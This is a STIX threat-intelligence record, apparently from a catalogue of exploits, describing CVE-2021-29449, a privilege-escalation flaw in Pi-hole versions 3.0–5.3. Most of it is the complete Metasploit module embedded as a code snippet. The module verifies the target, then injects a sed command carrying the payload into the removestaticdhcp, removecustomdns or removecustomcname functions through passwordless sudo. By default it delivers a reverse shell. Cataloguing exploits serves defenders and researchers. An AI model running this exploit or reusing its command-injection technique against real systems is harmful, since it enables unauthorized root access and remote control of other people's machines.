{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8259ed0f-b3bc-4a8a-8720-a07ab94d9a27",
    "created": "2024-08-14T16:59:15.837677Z",
    "modified": "2024-08-14T16:59:15.83768Z",
    "name": "Pi-Hole Remove Commands Linux Priv Esc",
    "description": " Pi-Hole versions 3.0 - 5.3 allows for command line input to the removecustomcname removecustomdns, and removestaticdhcp functions without properly validating the parameters before passing to sed.  When executed as the www-data user this allows for a privilege escalation to root since www-data is in the sudoers.d/pihole file with no password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/pihole_remove_commands_lpe.rb",
            "external_id": "pihole_remove_commands_lpe.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pi-hole/pi-hole/security/advisories/GHSA-3597-244c-wrpj"
        },
        {
            "source_name": "reference",
            "url": "https://www.compass-security.com/fileadmin/Research/Advisories/2021-02_CSNC-2021-008_Pi-hole_Privilege_Escalation.txt"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-29449"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  # includes: is_root?\n  include Msf::Post::Linux::Priv\n  # includes writable?, upload_file, upload_and_chmodx, exploit_data\n  include Msf::Post::File\n  # for whoami\n  include Msf::Post::Unix\n  # for get_session_pid needed by whoami\n  include Msf::Post::Linux::System\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pi-Hole Remove Commands Linux Priv Esc',\n        'Description' => %q{\n          Pi-Hole versions 3.0 - 5.3 allows for command line input to the removecustomcname,\n          removecustomdns, and removestaticdhcp functions without properly validating\n          the parameters before passing to sed.  When executed as the www-data user,\n          this allows for a privilege escalation to root since www-data is in the\n          sudoers.d/pihole file with no password.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Emanuele Barbeno <emanuele.barbeno[at]compass-security.com>' # original PoC, analysis\n        ],\n        'Platform' => [ 'unix', 'linux' ],\n        'Arch' => [ ARCH_CMD ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse_php_ssl' },\n        'Payload' => {\n          'BadChars' => \"\\x27\" # '\n        },\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://github.com/pi-hole/pi-hole/security/advisories/GHSA-3597-244c-wrpj' ],\n          [ 'URL', 'https://www.compass-security.com/fileadmin/Research/Advisories/2021-02_CSNC-2021-008_Pi-hole_Privilege_Escalation.txt' ],\n          [ 'CVE', '2021-29449' ]\n        ],\n        'DisclosureDate' => '2021-04-20',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        },\n        'Targets' => [\n          ['DHCP', { 'min' => Rex::Version.new('3.0') }], # exploitable by default, expecially when combined with unix/http/pihole_dhcp_mac_exec\n          ['DNS', { 'min' => Rex::Version.new('5.0') }],\n          ['CNAME', { 'min' => Rex::Version.new('5.1') }],\n        ],\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def sudo_pihole\n    'sudo -n /usr/local/bin/pihole -a'\n  end\n\n  def pihole_version\n    version = cmd_exec('sudo -n /usr/local/bin/pihole -v')\n    /Pi-hole version is v([^ ]+)/ =~ version\n    Rex::Version.new(Regexp.last_match(1))\n  end\n\n  def check\n    w = whoami\n    print_status(\"Current user: #{w}\")\n    v = pihole_version\n    print_status(\"Pi-hole version: #{v}\")\n    unless v.between?(target['min'], Rex::Version.new('5.3'))\n      return CheckCode::Safe(\"Pi-Hole version #{v} is >= 5.3 and not vulnerable\")\n    end\n    unless w == 'www-data'\n      return CheckCode::Safe(\"User must be www-data, currently #{w}\")\n    end\n\n    CheckCode::Appears(\"Pi-Hole #{v} with user #{w} is vulnerable and exploitable\")\n  end\n\n  def method_dhcp\n    f = '/etc/dnsmasq.d/04-pihole-static-dhcp.conf'\n    if !file?(f) || read_file(f).empty?\n      mac = Faker::Internet.mac_address\n      ip = \"10.199.#{rand_text_numeric(1..2).to_i}.#{rand_text_numeric(1..2).to_i}\"\n      print_status(\"Adding static DHCP #{mac} #{ip}\")\n      cmd_exec(\"#{sudo_pihole} addstaticdhcp '#{mac}' '#{ip}'\")\n    end\n    unless file?(f)\n      print_error(\"Config file not found: #{f}\")\n      return\n    end\n    print_good(\"#{f} found!\")\n    print_status('Executing payload against removestaticdhcp command')\n    cmd_exec(\"#{sudo_pihole} removestaticdhcp 'a/d ; 1e #{payload.encoded} ; /'\")\n    if mac\n      cmd_exec(\"#{sudo_pihole} removestaticdhcp '#{mac}'\")\n    end\n  end\n\n  def method_dns\n    f = '/etc/pihole/custom.list'\n    if !file?(f) || read_file(f).empty?\n      name = Faker::Internet.domain_name\n      ip = \"10.199.#{rand_text_numeric(1..2).to_i}.#{rand_text_numeric(1..2).to_i}\"\n      print_status(\"Adding DNS entry #{name} #{ip}\")\n      cmd_exec(\"#{sudo_pihole} addcustomdns '#{ip}' '#{name}'\")\n    end\n    unless file?(f)\n      print_error(\"Config file not found: #{f}\")\n      return\n    end\n    print_good(\"#{f} found!\")\n    print_status('Executing payload against removecustomdns command')\n    cmd_exec(\"#{sudo_pihole} removecustomdns 'a/d ; 1e #{payload.encoded} ; /'\")\n    if name\n      cmd_exec(\"#{sudo_pihole} removecustomdns '#{ip}' '#{name}'\")\n    end\n  end\n\n  def method_cname\n    f = '/etc/dnsmasq.d/05-pihole-custom-cname.conf'\n    if !file?(f) || read_file(f).empty?\n      name = \"#{rand_text_alphanumeric(8..12)}.edu\"\n      print_status(\"Adding CNAME entry #{name}\")\n      cmd_exec(\"#{sudo_pihole} addcustomcname '#{name}' '#{name}'\")\n    end\n    unless file?(f)\n      print_error(\"Config file not found: #{f}\")\n      return\n    end\n    print_good(\"#{f} found!\")\n    print_status('Executing payload against removecustomcname command')\n    cmd_exec(\"#{sudo_pihole} removecustomcname 'a/d ; 1e #{payload.encoded} ; /'\")\n    if name\n      cmd_exec(\"#{sudo_pihole} removecustomcname '#{name}' '#{name}'\")\n    end\n  end\n\n  def exploit\n    if target.name == 'DHCP'\n      method_dhcp\n    elsif target.name == 'DNS'\n      method_dns\n    elsif target.name == 'CNAME'\n      method_cname\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-20",
    "x_mitre_platforms": [
        "[ 'unix', 'linux' ]"
    ]
}